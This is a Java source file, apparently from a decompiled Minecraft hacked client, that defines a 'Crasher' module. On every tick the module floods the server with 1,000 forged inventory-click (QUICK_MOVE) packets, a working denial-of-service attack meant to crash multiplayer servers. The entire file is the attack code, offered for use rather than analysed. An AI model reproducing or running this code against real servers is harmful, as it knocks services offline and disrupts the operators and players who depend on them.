

package dev.madcat.rebirth.features.modules.misc;

import dev.madcat.rebirth.features.modules.*;
import dev.madcat.rebirth.features.setting.*;
import dev.madcat.rebirth.*;
import net.minecraft.util.*;
import net.minecraft.item.*;
import net.minecraft.inventory.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;

public class Crasher extends Module
{
    private final Setting<Boolean> escoff;
    
    public Crasher() {
        super("Crasher", "crash", Category.MISC, true, false, false);
        this.escoff = (Setting<Boolean>)this.register(new Setting("EscOff", (T)true));
    }
    
    @Override
    public void onLogout() {
        if (this.escoff.getValue() && Rebirth.moduleManager.isModuleEnabled("Crasher")) {
            this.disable();
        }
    }
    
    @Override
    public void onLogin() {
        if (this.escoff.getValue() && Rebirth.moduleManager.isModuleEnabled("Crasher")) {
            this.disable();
        }
    }
    
    @Override
    public void onTick() {
        if (fullNullCheck()) {
            return;
        }
        for (int j = 0; j < 1000; ++j) {
            final ItemStack item = new ItemStack(Crasher.mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
            final CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
            Crasher.mc.player.connection.sendPacket((Packet)packet);
        }
    }
}
